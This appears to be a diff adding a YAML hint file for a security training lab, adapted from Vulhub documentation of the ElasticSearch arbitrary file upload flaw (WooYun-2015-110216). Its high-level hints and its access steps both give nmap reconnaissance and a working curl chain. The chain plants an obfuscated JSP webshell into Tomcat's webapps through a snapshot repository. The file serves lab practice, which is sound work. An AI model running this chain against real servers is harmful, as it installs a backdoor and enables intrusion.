@@ -1,0 +1,132 @@
+# Optional ScenarioForge guide hints; derived from the adjacent public Vulhub documentation.
+schema_version: 1
+match: elasticsearch/WooYun-2015-110216
+hint_levels:
+  low:
+  - Inspect the elasticsearch service or application on {{NODE_NAME}} @ {{NODE_IP}}.
+  medium:
+  - |-
+    Catalog TCP ports: 8080,9200. Identify the exposed services:
+
+    ```bash
+    nmap -Pn -sT -sV -p 8080,9200 {{NODE_IP}}
+    ```
+  - 'Catalog port mappings (published → container): es: 9200/tcp → container 9200/tcp; es: 8080/tcp → container
+    8080/tcp. These are recipe defaults; use the deployed service port if the scenario remaps it.'
+  - 'Documented target URL(s): `http://{{NODE_IP}}:9200`, `http://{{NODE_IP}}:8080`.'
+  high:
+  - 'Vulnerability: ElasticSearch Arbitrary File Upload (WooYun-2015-110216).'
+  - |-
+    Vulnerability Reproduction
+
+    Our goal is to use ElasticSearch to write a webshell into `/usr/local/tomcat/webapps`.
+
+    First, create a malicious index document:
+
+    ```
+    curl -XPOST http://{{NODE_IP}}:9200/yz.jsp/yz.jsp/1 -d'
+    {"<%new java.io.RandomAccessFile(application.getRealPath(new String(new byte[]{47,116,101,115,116,46,106,115,112})),new String(new byte[]{114,119})).write(request.getParameter(new String(new byte[]{102})).getBytes());%>":"test"}
+    '
+    ```
+
+    Then create a malicious repository. The `location` value is the path where we want to write our file.
+
+    > Note: The Repositories path is interesting because it can write to any accessible location, and if the path doesn't exist, it will be created automatically. This means you can create arbitrary directories using the file access protocol. Here we point the path to Tomcat's web deployment directory because Tomcat will automatically create a new application when a folder is created in this directory (if the filename is wwwroot, the created application name will be wwwroot).
+
+    ```
+    curl -XPUT 'http://{{NODE_IP}}:9200/_snapshot/yz.jsp' -d '{
+         "type": "fs",
+         "settings": {
+              "location": "/usr/local/tomcat/webapps/wwwroot/",
+              "compress": false
+         }
+    }'
+    ```
+
+    Verify and create the repository:
+
+    ```
+    curl -XPUT "http://{{NODE_IP}}:9200/_snapshot/yz.jsp/yz.jsp" -d '{
+         "indices": "yz.jsp",
+         "ignore_unavailable": "true",
+         "include_global_state": false
+    }'
+    ```
+
+    Done!
+
+    Access `http://{{NODE_IP}}:8080/wwwroot/indices/yz.jsp/snapshot-yz.jsp` to find our uploaded webshell.
+
+    This shell allows writing arbitrary strings to test.jsp in the wwwroot directory. For example: `http://{{NODE_IP}}:8080/wwwroot/indices/yz.jsp/snapshot-yz.jsp?f=success`. Then accessing /wwwroot/test.jsp will show "success":
+
+    Documentation illustration: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/elasticsearch/WooYun-2015-110216/1.png
+  - 'Publicly available documentation: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/elasticsearch/WooYun-2015-110216/README.md'
+  - |-
+    Additional public references:
+    - http://cb.drops.wiki/bugs/wooyun-2015-0110216.html
+access_instructions:
+  title: ElasticSearch Arbitrary File Upload (WooYun-2015-110216)
+  steps:
+  - title: Locate the target service
+    instructions: |-
+      Catalog TCP ports: 8080,9200. Identify the exposed services:
+
+      ```bash
+      nmap -Pn -sT -sV -p 8080,9200 {{NODE_IP}}
+      ```
+
+      Catalog port mappings (published → container): es: 9200/tcp → container 9200/tcp; es: 8080/tcp → container 8080/tcp. These are recipe defaults; use the deployed service port if the scenario remaps it.
+
+      Documented target URL(s): `http://{{NODE_IP}}:9200`, `http://{{NODE_IP}}:8080`.
+  - title: Vulnerability Reproduction
+    instructions: |-
+      Our goal is to use ElasticSearch to write a webshell into `/usr/local/tomcat/webapps`.
+
+      First, create a malicious index document:
+
+      ```
+      curl -XPOST http://{{NODE_IP}}:9200/yz.jsp/yz.jsp/1 -d'
+      {"<%new java.io.RandomAccessFile(application.getRealPath(new String(new byte[]{47,116,101,115,116,46,106,115,112})),new String(new byte[]{114,119})).write(request.getParameter(new String(new byte[]{102})).getBytes());%>":"test"}
+      '
+      ```
+
+      Then create a malicious repository. The `location` value is the path where we want to write our file.
+
+      > Note: The Repositories path is interesting because it can write to any accessible location, and if the path doesn't exist, it will be created automatically. This means you can create arbitrary directories using the file access protocol. Here we point the path to Tomcat's web deployment directory because Tomcat will automatically create a new application when a folder is created in this directory (if the filename is wwwroot, the created application name will be wwwroot).
+
+      ```
+      curl -XPUT 'http://{{NODE_IP}}:9200/_snapshot/yz.jsp' -d '{
+           "type": "fs",
+           "settings": {
+                "location": "/usr/local/tomcat/webapps/wwwroot/",
+                "compress": false
+           }
+      }'
+      ```
+
+      Verify and create the repository:
+
+      ```
+      curl -XPUT "http://{{NODE_IP}}:9200/_snapshot/yz.jsp/yz.jsp" -d '{
+           "indices": "yz.jsp",
+           "ignore_unavailable": "true",
+           "include_global_state": false
+      }'
+      ```
+
+      Done!
+
+      Access `http://{{NODE_IP}}:8080/wwwroot/indices/yz.jsp/snapshot-yz.jsp` to find our uploaded webshell.
+
+      This shell allows writing arbitrary strings to test.jsp in the wwwroot directory. For example: `http://{{NODE_IP}}:8080/wwwroot/indices/yz.jsp/snapshot-yz.jsp?f=success`. Then accessing /wwwroot/test.jsp will show "success":
+
+      Documentation illustration: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/elasticsearch/WooYun-2015-110216/1.png
+guidance_source:
+  repository: https://github.com/vulhub/vulhub
+  snapshot_commit: 3af973a39bd0988f288a53fa9ea4b82372774e58
+  documentation_url: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/elasticsearch/WooYun-2015-110216/README.md
+  readme_sha256: 9292eaad8b8f62f69075ab59d4e5480b8638bdc93d928f389b552d933e0cb724
+  compose_sha256: bb79b756221a31e407e2e19b505641f3a7504794cce741385aa25cc3bc10c102
+  license: MIT; see vulnhub/content/LICENSE
+  method: Tiered discovery hints and adapted reproduction text from the local catalog snapshot. Reproduction commands
+    have not been executed.
